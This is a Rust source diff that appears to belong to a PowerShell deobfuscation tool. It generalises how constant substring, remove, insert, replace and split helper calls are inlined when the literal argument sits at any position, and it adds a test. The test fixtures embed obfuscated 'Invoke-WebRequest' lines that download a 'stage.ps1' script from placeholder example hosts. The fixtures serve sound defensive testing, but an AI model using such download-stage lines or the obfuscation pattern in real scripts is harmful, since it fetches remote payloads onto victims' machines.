@@ -3524,8 +3524,15 @@ fn expand_literal_substring_extractor_calls(text: &str) -> String {
             continue;
         };
 
-        out =
-            inline_ps_literal_const_substring_calls(&out, &name, value_idx, value_var, start, len);
+        out = inline_ps_literal_const_substring_calls(
+            &out,
+            &name,
+            value_idx,
+            value_var,
+            param_index.len(),
+            start,
+            len,
+        );
     }
     out
 }
@@ -3598,7 +3605,15 @@ fn expand_literal_remove_extractor_calls(text: &str) -> String {
             continue;
         };
 
-        out = inline_ps_literal_const_remove_calls(&out, &name, value_idx, value_var, start, count);
+        out = inline_ps_literal_const_remove_calls(
+            &out,
+            &name,
+            value_idx,
+            value_var,
+            param_index.len(),
+            start,
+            count,
+        );
     }
     out
 }
@@ -3669,8 +3684,15 @@ fn expand_literal_insert_extractor_calls(text: &str) -> String {
             continue;
         };
 
-        out =
-            inline_ps_literal_const_insert_calls(&out, &name, value_idx, value_var, start, &insert);
+        out = inline_ps_literal_const_insert_calls(
+            &out,
+            &name,
+            value_idx,
+            value_var,
+            param_index.len(),
+            start,
+            &insert,
+        );
     }
     out
 }
@@ -3826,7 +3848,13 @@ fn expand_literal_replace_extractor_calls(text: &str) -> String {
         };
 
         out = inline_ps_literal_const_replace_calls(
-            &out, &name, value_idx, value_var, &needle, &repl,
+            &out,
+            &name,
+            value_idx,
+            value_var,
+            param_index.len(),
+            &needle,
+            &repl,
         );
     }
     out
@@ -3980,7 +4008,13 @@ fn expand_literal_split_index_extractor_calls(text: &str) -> String {
         };
 
         out = inline_ps_literal_const_split_index_calls(
-            &out, &name, value_idx, value_var, &sep, index,
+            &out,
+            &name,
+            value_idx,
+            value_var,
+            param_index.len(),
+            &sep,
+            index,
         );
     }
     out
@@ -4286,6 +4320,7 @@ fn inline_ps_literal_const_substring_calls(
     name: &str,
     value_idx: usize,
     value_name: &str,
+    arg_count: usize,
     start: usize,
     len: Option<usize>,
 ) -> String {
@@ -4328,23 +4363,16 @@ fn inline_ps_literal_const_substring_calls(
                     continue;
                 }
             }
-            let Some((value_end, value)) = parse_ps_static_quoted_literal(text, pos) else {
+            let Some((call_end, value)) = parse_ps_positional_static_literal_arg(
+                text,
+                pos,
+                parenthesized,
+                value_idx,
+                arg_count,
+            ) else {
                 search_from = end_name;
                 continue;
             };
-            let mut call_end = value_end;
-            if parenthesized {
-                let after = skip_ascii_ws(bytes, call_end);
-                if bytes.get(after) != Some(&b')') {
-                    search_from = value_end;
-                    continue;
-                }
-                call_end = after + 1;
-            }
-            if value_idx != 0 {
-                search_from = call_end;
-                continue;
-            }
             let Some(replacement) = ps_literal_const_substring_replacement(&value, start, len)
             else {
                 search_from = call_end;
@@ -4406,6 +4434,7 @@ fn inline_ps_literal_const_remove_calls(
     name: &str,
     value_idx: usize,
     value_name: &str,
+    arg_count: usize,
     start: usize,
     count: Option<usize>,
 ) -> String {
@@ -4448,23 +4477,16 @@ fn inline_ps_literal_const_remove_calls(
                     continue;
                 }
             }
-            let Some((value_end, value)) = parse_ps_static_quoted_literal(text, pos) else {
+            let Some((call_end, value)) = parse_ps_positional_static_literal_arg(
+                text,
+                pos,
+                parenthesized,
+                value_idx,
+                arg_count,
+            ) else {
                 search_from = end_name;
                 continue;
             };
-            let mut call_end = value_end;
-            if parenthesized {
-                let after = skip_ascii_ws(bytes, call_end);
-                if bytes.get(after) != Some(&b')') {
-                    search_from = value_end;
-                    continue;
-                }
-                call_end = after + 1;
-            }
-            if value_idx != 0 {
-                search_from = call_end;
-                continue;
-            }
             let Some(replacement) = ps_literal_const_remove_replacement(&value, start, count)
             else {
                 search_from = call_end;
@@ -4830,6 +4852,7 @@ fn inline_ps_literal_const_insert_calls(
     name: &str,
     value_idx: usize,
     value_name: &str,
+    arg_count: usize,
     start: usize,
     insert: &str,
 ) -> String {
@@ -4872,23 +4895,16 @@ fn inline_ps_literal_const_insert_calls(
                     continue;
                 }
             }
-            let Some((value_end, value)) = parse_ps_static_quoted_literal(text, pos) else {
+            let Some((call_end, value)) = parse_ps_positional_static_literal_arg(
+                text,
+                pos,
+                parenthesized,
+                value_idx,
+                arg_count,
+            ) else {
                 search_from = end_name;
                 continue;
             };
-            let mut call_end = value_end;
-            if parenthesized {
-                let after = skip_ascii_ws(bytes, call_end);
-                if bytes.get(after) != Some(&b')') {
-                    search_from = call_end;
-                    continue;
-                }
-                call_end = after + 1;
-            }
-            if value_idx != 0 {
-                search_from = call_end;
-                continue;
-            }
             let Some(replacement) = ps_literal_insert_replacement(&value, start, insert) else {
                 search_from = call_end;
                 continue;
@@ -5362,6 +5378,7 @@ fn inline_ps_literal_const_replace_calls(
     name: &str,
     value_idx: usize,
     value_name: &str,
+    arg_count: usize,
     needle: &str,
     repl: &str,
 ) -> String {
@@ -5404,24 +5421,17 @@ fn inline_ps_literal_const_replace_calls(
                     continue;
                 }
             }
-            let Some((value_end, value)) = parse_ps_static_quoted_literal(text, pos) else {
+            let Some((call_end, value)) = parse_ps_positional_static_literal_arg(
+                text,
+                pos,
+                parenthesized,
+                value_idx,
+                arg_count,
+            ) else {
                 search_from = end_name;
                 continue;
             };
             if value.len() > 8192 {
-                search_from = value_end;
-                continue;
-            }
-            let mut call_end = value_end;
-            if parenthesized {
-                let after = skip_ascii_ws(bytes, call_end);
-                if bytes.get(after) != Some(&b')') {
-                    search_from = value_end;
-                    continue;
-                }
-                call_end = after + 1;
-            }
-            if value_idx != 0 {
                 search_from = call_end;
                 continue;
             }
@@ -5478,6 +5488,7 @@ fn inline_ps_literal_const_split_index_calls(
     name: &str,
     value_idx: usize,
     value_name: &str,
+    arg_count: usize,
     sep: &str,
     index: usize,
 ) -> String {
@@ -5522,24 +5533,17 @@ fn inline_ps_literal_const_split_index_calls(
                     continue;
                 }
             }
-            let Some((value_end, value)) = parse_ps_static_quoted_literal(text, pos) else {
+            let Some((call_end, value)) = parse_ps_positional_static_literal_arg(
+                text,
+                pos,
+                parenthesized,
+                value_idx,
+                arg_count,
+            ) else {
                 search_from = end_name;
                 continue;
             };
             if value.len() > 8192 {
-                search_from = value_end;
-                continue;
-            }
-            let mut call_end = value_end;
-            if parenthesized {
-                let after = skip_ascii_ws(bytes, call_end);
-                if bytes.get(after) != Some(&b')') {
-                    search_from = value_end;
-                    continue;
-                }
-                call_end = after + 1;
-            }
-            if value_idx != 0 {
                 search_from = call_end;
                 continue;
             }
@@ -6366,6 +6370,43 @@ fn skip_ps_arg_separator(bytes: &[u8], pos: usize, parenthesized: bool) -> usize
         pos += 1;
     }
     skip_ascii_ws(bytes, pos)
+}
+
+fn parse_ps_positional_static_literal_arg(
+    text: &str,
+    mut pos: usize,
+    parenthesized: bool,
+    value_idx: usize,
+    arg_count: usize,
+) -> Option<(usize, String)> {
+    if arg_count == 0 || value_idx >= arg_count || arg_count > 8 {
+        return None;
+    }
+
+    let bytes = text.as_bytes();
+    let mut value = None;
+    let mut arg_end = pos;
+    for idx in 0..arg_count {
+        let (next_end, arg) = parse_ps_literal_or_usize_arg(text, pos)?;
+        if idx == value_idx {
+            value = Some(arg.as_str()?.to_string());
+        }
+        arg_end = next_end;
+        pos = next_end;
+        if idx + 1 < arg_count {
+            pos = skip_ps_arg_separator(bytes, pos, parenthesized);
+        }
+    }
+
+    if parenthesized {
+        let after = skip_ascii_ws(bytes, arg_end);
+        if bytes.get(after) != Some(&b')') {
+            return None;
+        }
+        arg_end = after + 1;
+    }
+
+    Some((arg_end, value?))
 }
 
 fn inline_ps_literal_calls(text: &str, name: &str) -> String {
@@ -9094,6 +9135,26 @@ Pick 'zz{decoded}yy'"#,
                 "'Invoke-WebRequest -Uri https://ps-const-substring-extractor.example/stage.ps1'"
             ),
             "constant substring extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_constant_substring_extractor_reordered_call_is_rewritten() {
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-reordered-const-substring.example/stage.ps1";
+        let text = format!(
+            r#"function Pick($unused,$value) {{
+  return $value.Substring(2,{len})
+}}
+Pick 0 'zz{decoded}yy'"#,
+            len = decoded.len()
+        );
+
+        let out = expand_literal_substring_extractor_calls(&text);
+
+        assert!(
+            out.contains(&format!("'{decoded}'")),
+            "reordered constant substring extractor call was not rewritten:\n{out}"
         );
     }
 
